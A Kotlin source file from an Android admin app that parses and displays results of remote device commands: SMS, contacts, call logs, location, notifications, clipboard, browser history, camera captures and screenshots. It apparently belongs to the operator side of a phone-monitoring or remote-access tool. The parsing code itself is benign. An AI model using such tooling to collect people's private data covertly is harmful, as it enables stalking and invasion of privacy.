package com.abuzahra.admin.ui.device

import com.google.gson.Gson
import com.google.gson.JsonArray
import com.google.gson.JsonElement
import com.google.gson.JsonObject
import com.google.gson.JsonParser
import com.google.gson.JsonPrimitive

/**
 * Parses the raw `result` JSON string returned by the device into a typed
 * [ParsedResult] that [CommandResultActivity] can render in a suitable UI
 * (list for SMS/contacts/calls, key-value table for device_info, image for
 * screenshots, coordinates + "open in maps" for location, raw JSON fallback).
 *
 * The parser is intentionally LENIENT: devices produce inconsistent JSON
 * shapes (some wrap lists in {"items":[...]}, some return bare arrays,
 * some return {"data":[...]}), so we try several shapes and gracefully fall
 * back to RawJson when nothing matches.
 */
object CommandResultParser {

    private val gson: Gson by lazy { Gson() }

    // ═══════════════════════════════════════════════════════════════
    // Parsed result sealed class + item types
    // ═══════════════════════════════════════════════════════════════

    sealed class ParsedResult {
        /** Empty result body (null, empty, or whitespace). */
        object Empty : ParsedResult()
        /** SMS list — shown in item_sms cards. */
        data class SmsList(val items: List<SmsItem>) : ParsedResult()
        /** Contacts list — shown in item_contact cards. */
        data class ContactList(val items: List<ContactItem>) : ParsedResult()
        /** Call log list — shown in item_call cards. */
        data class CallList(val items: List<CallItem>) : ParsedResult()
        /** Location result — coordinates + extras, opens in maps. */
        data class Location(
            val lat: Double, val lng: Double,
            val accuracy: Double?, val extras: Map<String, String>
        ) : ParsedResult()
        /** Notification list — shown as key-value cards. */
        data class NotificationList(val items: List<NotificationItem>) : ParsedResult()
        /** Installed apps list — shown as key-value cards. */
        data class AppList(val items: List<AppItem>) : ParsedResult()
        /** Generic key-value map — device_info, battery, wifi_info, etc. */
        data class KeyValueMap(val title: String, val items: List<KeyValuePair>) : ParsedResult()
        /** Base64 JPEG image (screenshot, front_camera, back_camera). */
        data class Image(val base64: String, val mimeType: String = "image/jpeg") : ParsedResult()
        /** Battery status. */
        data class Battery(val level: Int, val charging: Boolean, val extras: Map<String, String>) : ParsedResult()
        /** File listing (list_files, list_dcim, recent_files, etc.). */
        data class FileList(val items: List<FileItem>) : ParsedResult()
        /** Fallback: render the raw JSON in a scrollable TextView. */
        data class RawJson(val text: String) : ParsedResult()
    }

    data class SmsItem(
        val sender: String,
        val body: String,
        val date: String,
        val type: String? = null
    )

    data class ContactItem(
        val name: String,
        val phone: String,
        val email: String? = null
    )

    data class CallItem(
        val number: String,
        val type: String,
        val durationSeconds: Long?,
        val date: String
    )

    data class NotificationItem(
        val app: String,
        val title: String,
        val text: String,
        val time: String
    )

    data class AppItem(
        val name: String,
        val packageName: String,
        val version: String?,
        val isSystem: Boolean
    )

    data class KeyValuePair(val key: String, val value: String)

    data class FileItem(
        val name: String,
        val path: String,
        val size: Long,
        val isDirectory: Boolean,
        val modified: String?
    )

    // ═══════════════════════════════════════════════════════════════
    // Public entry point
    // ═══════════════════════════════════════════════════════════════

    /**
     * Parse the [rawResult] string for the given [commandKey].
     *
     * @param commandKey one of: sms/get_sms, contacts/get_contacts, …
     *        Accepts both short server registry keys ("sms") and actual
     *        device commands ("get_sms").
     * @param rawResult the JSON string stored in Command.result
     */
    fun parse(commandKey: String, rawResult: String?): ParsedResult {
        val trimmed = rawResult?.trim().orEmpty()
        if (trimmed.isEmpty() || trimmed == "null" || trimmed == "{}" || trimmed == "[]") {
            return ParsedResult.Empty
        }

        val root: JsonElement = try {
            JsonParser.parseString(trimmed)
        } catch (e: Exception) {
            // Not valid JSON — return as raw text so the user can at least see it.
            return ParsedResult.RawJson(trimmed)
        }

        val key = commandKey.trim().lowercase()
        return when {
            // ── SMS ────────────────────────────────────────────────
            key in setOf("sms", "get_sms") -> parseSms(root)

            // ── Contacts ──────────────────────────────────────────
            key in setOf("contacts", "get_contacts") -> parseContacts(root)

            // ── Calls ─────────────────────────────────────────────
            key in setOf("calls", "get_calls") -> parseCalls(root)

            // ── Location ──────────────────────────────────────────
            key in setOf("location", "get_location") -> parseLocation(root)

            // ── Notifications ─────────────────────────────────────
            key in setOf("notifications", "get_notifications") -> parseNotifications(root)

            // ── Apps ──────────────────────────────────────────────
            key in setOf("apps", "get_apps", "installed_apps", "get_installed_apps",
                          "running_apps", "get_running_apps") -> parseApps(root)

            // ── Device info / wifi / network / sim / storage ─────
            key in setOf("info", "get_info", "device_info",
                          "wifi_info", "get_wifi_info",
                          "network_info", "get_network_info",
                          "sim_info", "get_sim_info",
                          "storage_info", "get_storage_info",
                          "check_root", "device_admin_status") -> parseKeyValueMap(root, "معلومات")

            // ── Battery ───────────────────────────────────────────
            key in setOf("battery", "get_battery") -> parseBattery(root)

            // ── Gallery (list of image paths/urls) ───────────────
            key in setOf("gallery", "get_gallery") -> parseFileList(root)

            // ── Clipboard (returns text) ─────────────────────────
            key in setOf("clipboard", "get_clipboard") -> parseClipboard(root)

            // ── Calendar ─────────────────────────────────────────
            key in setOf("calendar", "get_calendar") -> parseKeyValueMap(root, "أحداث التقويم")

            // ── Browser history ──────────────────────────────────
            key in setOf("browser_history", "get_browser_history") -> parseBrowserHistory(root)

            // ── App usage ────────────────────────────────────────
            key in setOf("app_usage", "get_app_usage") -> parseKeyValueMap(root, "وقت الاستخدام")

            // ── Screenshots / camera captures (base64 image) ─────
            key in setOf("screenshot", "front_camera", "back_camera") -> parseImage(root)

            // ── File listings ────────────────────────────────────
            key.startsWith("list_") || key in setOf("recent_files", "get_files") -> parseFileList(root)

            // ── All data (bundled) ───────────────────────────────
            key in setOf("all_data", "get_all_data") -> parseAllData(root)

            // ── Default fallback ─────────────────────────────────
            else -> ParsedResult.RawJson(prettyPrintJson(root) ?: trimmed)
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Helpers
    // ═══════════════════════════════════════════════════════════════

    /**
     * Try to extract a list from a root that could be:
     * - a bare JSON array
     * - an object with one of these keys holding an array:
     *   "items", "data", "list", "results", "sms", "contacts", "calls",
     *   "notifications", "apps", "files"
     */
    private fun extractArray(root: JsonElement, vararg keysToTry: String): JsonArray? {
        if (root.isJsonArray) return root.asJsonArray
        if (!root.isJsonObject) return null
        val obj = root.asJsonObject
        // Try caller-specified keys first
        for (key in keysToTry) {
            val el = obj.get(key)
            if (el != null && el.isJsonArray) return el.asJsonArray
        }
        // Try a set of common keys
        val common = listOf("items", "data", "list", "results", "records")
        for (key in common) {
            val el = obj.get(key)
            if (el != null && el.isJsonArray) return el.asJsonArray
        }
        // Try the first array-valued property
        for ((_, v) in obj.entrySet()) {
            if (v.isJsonArray) return v.asJsonArray
        }
        return null
    }

    private fun str(el: JsonElement?): String {
        if (el == null || el.isJsonNull) return ""
        return when (el) {
            is JsonPrimitive -> el.asString
            else -> el.toString()
        }
    }

    private fun str(obj: JsonObject?, key: String): String = str(obj?.get(key))

    private fun num(el: JsonElement?): Double? {
        if (el == null || el.isJsonNull) return null
        return try {
            (el as JsonPrimitive).asDouble
        } catch (e: Exception) {
            el.asString.toDoubleOrNull()
        }
    }

    private fun num(obj: JsonObject?, key: String): Double? = num(obj?.get(key))

    private fun bool(el: JsonElement?): Boolean? {
        if (el == null || el.isJsonNull) return null
        return try {
            (el as JsonPrimitive).asBoolean
        } catch (e: Exception) {
            when (el.asString.lowercase()) {
                "true", "1", "yes", "charging", "charged" -> true
                "false", "0", "no", "discharging" -> false
                else -> null
            }
        }
    }

    private fun bool(obj: JsonObject?, key: String, vararg altKeys: String): Boolean? {
        bool(obj?.get(key))?.let { return it }
        for (k in altKeys) bool(obj?.get(k))?.let { return it }
        return null
    }

    private fun prettyPrintJson(root: JsonElement): String? {
        return try {
            gson.toJson(root)
        } catch (e: Exception) { null }
    }

    private fun firstNonEmpty(vararg values: String?): String? {
        for (v in values) if (!v.isNullOrBlank()) return v
        return null
    }

    private fun looksLikeBase64Image(s: String): Boolean {
        if (s.length < 100) return false
        // JPEG: /9j/  ,  PNG: iVBOR  ,  WebP: UklGR
        return s.startsWith("/9j/") || s.startsWith("iVBOR") || s.startsWith("UklGR") ||
            (s.length > 1000 && s.matches(Regex("^[A-Za-z0-9+/=\\s]+$")))
    }

    /**
     * Format a date string that could be:
     * - epoch millis as string ("1700000000000")
     * - epoch seconds ("1700000000")
     * - ISO 8601 ("2024-01-01T12:00:00")
     * - already-formatted date
     * Returns a friendly "yyyy-MM-dd HH:mm" string, or the input on failure.
     */
    private fun formatDate(input: String): String {
        if (input.isBlank()) return ""
        // Try epoch millis (>= 10 digits)
        input.toLongOrNull()?.let { ms ->
            return try {
                val sdf = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US)
                sdf.format(java.util.Date(ms))
            } catch (e: Exception) { input }
        }
        // Try ISO 8601
        return try {
            val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", java.util.Locale.US)
            val date = sdf.parse(input) ?: return input
            java.text.SimpleDateFormat("yyyy-MM-dd HH:mm", java.util.Locale.US).format(date)
        } catch (e: Exception) {
            input
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // Per-type parsers
    // ═══════════════════════════════════════════════════════════════

    private fun parseSms(root: JsonElement): ParsedResult {
        val arr = extractArray(root, "sms", "messages")
            ?: return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        val items = arr.mapNotNull { el ->
            if (!el.isJsonObject) return@mapNotNull null
            val o = el.asJsonObject
            val sender = firstNonEmpty(
                str(o, "address"), str(o, "sender"), str(o, "number"),
                str(o, "from"), str(o, "phone")
            ) ?: "غير معروف"
            val body = firstNonEmpty(
                str(o, "body"), str(o, "message"), str(o, "text"), str(o, "msg")
            ) ?: ""
            val date = firstNonEmpty(
                str(o, "date"), str(o, "date_sent"), str(o, "timestamp"),
                str(o, "time"), str(o, "received")
            ) ?: ""
            val type = firstNonEmpty(str(o, "type"), str(o, "folder"))
            SmsItem(sender, body, formatDate(date), type)
        }
        return if (items.isEmpty()) ParsedResult.Empty else ParsedResult.SmsList(items)
    }

    private fun parseContacts(root: JsonElement): ParsedResult {
        val arr = extractArray(root, "contacts")
            ?: return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        val items = arr.mapNotNull { el ->
            if (!el.isJsonObject) return@mapNotNull null
            val o = el.asJsonObject
            val name = firstNonEmpty(
                str(o, "name"), str(o, "display_name"), str(o, "displayName"),
                str(o, "contact_name")
            ) ?: "بدون اسم"
            val phone = firstNonEmpty(
                str(o, "phone"), str(o, "number"), str(o, "phone_number"),
                str(o, "mobile"), str(o, "tel")
            ) ?: ""
            // Phone numbers could also be in a "phones" array
            val phoneResolved = phone.ifEmpty {
                (o.get("phones") as? JsonArray)?.firstOrNull()?.let { str(it) }
                    ?: (o.get("numbers") as? JsonArray)?.firstOrNull()?.let { str(it) }
                    ?: ""
            }
            val email = firstNonEmpty(str(o, "email"), str(o, "emails"))
                ?: (o.get("emails") as? JsonArray)?.firstOrNull()?.let { str(it) }
            ContactItem(name, phoneResolved, email)
        }
        return if (items.isEmpty()) ParsedResult.Empty else ParsedResult.ContactList(items)
    }

    private fun parseCalls(root: JsonElement): ParsedResult {
        val arr = extractArray(root, "calls")
            ?: return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        val items = arr.mapNotNull { el ->
            if (!el.isJsonObject) return@mapNotNull null
            val o = el.asJsonObject
            val number = firstNonEmpty(
                str(o, "number"), str(o, "phone"), str(o, "address"), str(o, "phone_number")
            ) ?: "غير معروف"
            val rawType = firstNonEmpty(
                str(o, "type"), str(o, "call_type")
            )?.lowercase() ?: "unknown"
            val normalizedType = when {
                rawType.contains("incom") || rawType == "1" -> "incoming"
                rawType.contains("outgo") || rawType == "2" -> "outgoing"
                rawType.contains("miss") || rawType == "3" || rawType == "5" -> "missed"
                rawType.contains("reject") || rawType == "4" -> "rejected"
                else -> "unknown"
            }
            val duration = num(o, "duration")?.toLong()
                ?: num(o, "duration_seconds")?.toLong()
            val date = firstNonEmpty(
                str(o, "date"), str(o, "timestamp"), str(o, "time"), str(o, "call_date")
            ) ?: ""
            CallItem(number, normalizedType, duration, formatDate(date))
        }
        return if (items.isEmpty()) ParsedResult.Empty else ParsedResult.CallList(items)
    }

    private fun parseLocation(root: JsonElement): ParsedResult {
        val obj = when {
            root.isJsonObject -> root.asJsonObject
            // Could be a one-element array containing the location
            root.isJsonArray && root.asJsonArray.size() > 0 &&
                root.asJsonArray[0].isJsonObject -> root.asJsonArray[0].asJsonObject
            else -> return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        }
        val lat = num(obj, "lat") ?: num(obj, "latitude") ?: num(obj, "lat_d")
        val lng = num(obj, "lng") ?: num(obj, "lon") ?: num(obj, "longitude") ?: num(obj, "lng_d")
        if (lat == null || lng == null) {
            // Location may be nested under "location" or "coords"
            val nested = obj.get("location")?.let { if (it.isJsonObject) it.asJsonObject else null }
                ?: obj.get("coords")?.let { if (it.isJsonObject) it.asJsonObject else null }
            if (nested != null) return parseLocation(nested)
            // Give up — show as key-value map
            return parseKeyValueMap(root, "الموقع")
        }
        val accuracy = num(obj, "accuracy") ?: num(obj, "acc")
        val extras = mutableMapOf<String, String>()
        for ((k, v) in obj.entrySet()) {
            val lk = k.lowercase()
            if (lk in setOf("lat", "latitude", "lng", "lon", "longitude", "accuracy", "acc")) continue
            val sv = str(v)
            if (sv.isNotEmpty()) extras[k] = sv
        }
        return ParsedResult.Location(lat, lng, accuracy, extras)
    }

    private fun parseNotifications(root: JsonElement): ParsedResult {
        val arr = extractArray(root, "notifications", "items")
            ?: return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        val items = arr.mapNotNull { el ->
            if (!el.isJsonObject) return@mapNotNull null
            val o = el.asJsonObject
            val app = firstNonEmpty(
                str(o, "package"), str(o, "package_name"), str(o, "app"), str(o, "source")
            ) ?: "غير معروف"
            val title = firstNonEmpty(str(o, "title"), str(o, "subject")) ?: ""
            val text = firstNonEmpty(str(o, "text"), str(o, "body"), str(o, "message"), str(o, "content")) ?: ""
            val time = firstNonEmpty(str(o, "time"), str(o, "timestamp"), str(o, "date"), str(o, "when")) ?: ""
            NotificationItem(app, title, text, formatDate(time))
        }
        return if (items.isEmpty()) ParsedResult.Empty else ParsedResult.NotificationList(items)
    }

    private fun parseApps(root: JsonElement): ParsedResult {
        val arr = extractArray(root, "apps", "installed_apps", "running_apps")
            ?: return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        val items = arr.mapNotNull { el ->
            if (!el.isJsonObject) return@mapNotNull null
            val o = el.asJsonObject
            val name = firstNonEmpty(
                str(o, "name"), str(o, "app_name"), str(o, "label"), str(o, "display_name")
            ) ?: "غير معروف"
            val pkg = firstNonEmpty(
                str(o, "package"), str(o, "package_name"), str(o, "pkg"), str(o, "id")
            ) ?: ""
            val version = firstNonEmpty(str(o, "version"), str(o, "version_name"), str(o, "versionName"))
            val isSystem = bool(o, "system", "is_system", "system_app") ?: false
            AppItem(name, pkg, version, isSystem)
        }
        return if (items.isEmpty()) ParsedResult.Empty else ParsedResult.AppList(items)
    }

    private fun parseKeyValueMap(root: JsonElement, title: String): ParsedResult {
        val obj = when {
            root.isJsonObject -> root.asJsonObject
            root.isJsonArray -> {
                // Array of {key, value} pairs
                val pairs = root.asJsonArray.mapNotNull { el ->
                    if (!el.isJsonObject) return@mapNotNull null
                    val o = el.asJsonObject
                    val k = firstNonEmpty(str(o, "key"), str(o, "name"), str(o, "label")) ?: return@mapNotNull null
                    val v = firstNonEmpty(str(o, "value"), str(o, "val"), str(o, "content")) ?: ""
                    KeyValuePair(k, v)
                }
                return if (pairs.isEmpty()) ParsedResult.Empty else ParsedResult.KeyValueMap(title, pairs)
            }
            else -> return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        }
        val pairs = obj.entrySet().mapNotNull { (k, v) ->
            if (v.isJsonNull) return@mapNotNull null
            val sv = when {
                v.isJsonObject || v.isJsonArray -> prettyPrintJson(v) ?: v.toString()
                else -> str(v)
            }
            if (sv.isEmpty()) return@mapNotNull null
            KeyValuePair(k, sv)
        }
        return if (pairs.isEmpty()) ParsedResult.Empty else ParsedResult.KeyValueMap(title, pairs)
    }

    private fun parseBattery(root: JsonElement): ParsedResult {
        if (!root.isJsonObject) {
            // Could be a bare number indicating percentage
            val pct = num(root)
            if (pct != null) return ParsedResult.Battery(pct.toInt(), false, emptyMap())
            return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        }
        val obj = root.asJsonObject
        val level = num(obj, "level") ?: num(obj, "battery") ?: num(obj, "percentage")
            ?: num(obj, "percent") ?: num(obj, "battery_level")
        val charging = bool(obj, "charging", "is_charging", "isCharging", "plugged")
            ?: (num(obj, "status")?.let { it == 2.0 || it == 3.0 }
                ?: (str(obj, "status").lowercase().let {
                    when { it.contains("charg") -> true; it.contains("full") -> true; else -> false }
                }))
        if (level == null) {
            // Fall back to key-value
            return parseKeyValueMap(root, "البطارية")
        }
        val extras = mutableMapOf<String, String>()
        for ((k, v) in obj.entrySet()) {
            val lk = k.lowercase()
            if (lk in setOf("level", "battery", "percentage", "percent", "battery_level",
                            "charging", "is_charging", "ischarging", "plugged", "status")) continue
            val sv = str(v)
            if (sv.isNotEmpty()) extras[k] = sv
        }
        return ParsedResult.Battery(level.toInt(), charging, extras)
    }

    private fun parseFileList(root: JsonElement): ParsedResult {
        val arr = extractArray(root, "files", "items")
            ?: return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        val items = arr.mapNotNull { el ->
            if (!el.isJsonObject) return@mapNotNull null
            val o = el.asJsonObject
            val name = firstNonEmpty(str(o, "name"), str(o, "filename"), str(o, "file_name")) ?: ""
            val path = firstNonEmpty(str(o, "path"), str(o, "full_path"), str(o, "absolute_path")) ?: name
            val size = num(o, "size")?.toLong() ?: 0L
            val isDir = bool(o, "is_dir", "is_directory", "directory")
                ?: (str(o, "type").lowercase() == "dir" || str(o, "type").lowercase() == "directory")
                ?: false
            val modified = firstNonEmpty(str(o, "modified"), str(o, "last_modified"), str(o, "date"))
            FileItem(name, path, size, isDir, modified)
        }
        return if (items.isEmpty()) ParsedResult.Empty else ParsedResult.FileList(items)
    }

    private fun parseClipboard(root: JsonElement): ParsedResult {
        // Clipboard may be a bare string, {"text": "..."}, or {"content": "..."}
        if (root.isJsonPrimitive) {
            val text = root.asString
            return if (text.isEmpty()) ParsedResult.Empty
            else ParsedResult.KeyValueMap("الحافظة", listOf(KeyValuePair("text", text)))
        }
        if (root.isJsonObject) {
            val obj = root.asJsonObject
            val text = firstNonEmpty(str(obj, "text"), str(obj, "content"), str(obj, "clip"))
                ?: return parseKeyValueMap(root, "الحافظة")
            return ParsedResult.KeyValueMap("الحافظة",
                listOf(KeyValuePair("text", text)))
        }
        return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
    }

    private fun parseBrowserHistory(root: JsonElement): ParsedResult {
        val arr = extractArray(root, "history", "items", "urls")
            ?: return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        // Convert to KeyValueMap (one card per history entry with title+url+time)
        val pairs = mutableListOf<KeyValuePair>()
        arr.forEachIndexed { idx, el ->
            if (!el.isJsonObject) return@forEachIndexed
            val o = el.asJsonObject
            val title = firstNonEmpty(str(o, "title"), str(o, "name")) ?: "(بدون عنوان)"
            val url = firstNonEmpty(str(o, "url"), str(o, "link")) ?: ""
            val time = firstNonEmpty(str(o, "date"), str(o, "time"), str(o, "timestamp")) ?: ""
            pairs.add(KeyValuePair("#${idx + 1} ${title}", url.ifEmpty { time }.ifEmpty { "(بدون رابط)" }))
            if (time.isNotEmpty()) pairs.add(KeyValuePair("  └─ الوقت", time))
        }
        return if (pairs.isEmpty()) ParsedResult.Empty else ParsedResult.KeyValueMap("سجل المتصفح", pairs)
    }

    private fun parseImage(root: JsonElement): ParsedResult {
        // Image result is most often a bare base64 string, sometimes wrapped
        // in {"image": "..."} / {"data": "..."} / {"base64": "..."}.
        if (root.isJsonPrimitive) {
            val s = root.asString
            return if (looksLikeBase64Image(s)) ParsedResult.Image(s)
            else ParsedResult.RawJson(s)
        }
        if (root.isJsonObject) {
            val obj = root.asJsonObject
            val candidate = firstNonEmpty(
                str(obj, "image"), str(obj, "data"), str(obj, "base64"),
                str(obj, "screenshot"), str(obj, "frame"), str(obj, "image_data")
            )
            if (candidate != null && looksLikeBase64Image(candidate)) {
                return ParsedResult.Image(candidate)
            }
            // Some payloads include a URL instead of base64
            val url = firstNonEmpty(str(obj, "url"), str(obj, "file_url"), str(obj, "link"))
            if (url != null) {
                return ParsedResult.RawJson("URL: $url")
            }
            // Fall back to showing the raw object
            return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        }
        return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
    }

    private fun parseAllData(root: JsonElement): ParsedResult {
        // all_data returns a bundled object: {sms:[...], contacts:[...], ...}
        // Flatten to a key-value map where each value is a short summary.
        if (!root.isJsonObject) return ParsedResult.RawJson(prettyPrintJson(root) ?: root.toString())
        val obj = root.asJsonObject
        val pairs = mutableListOf<KeyValuePair>()
        for ((k, v) in obj.entrySet()) {
            val sv = when {
                v.isJsonNull -> ""
                v.isJsonArray -> "${v.asJsonArray.size()} عنصر"
                v.isJsonObject -> prettyPrintJson(v) ?: v.toString()
                else -> str(v)
            }
            if (sv.isNotEmpty()) pairs.add(KeyValuePair(k, sv))
        }
        return if (pairs.isEmpty()) ParsedResult.Empty else ParsedResult.KeyValueMap("جميع البيانات", pairs)
    }
}
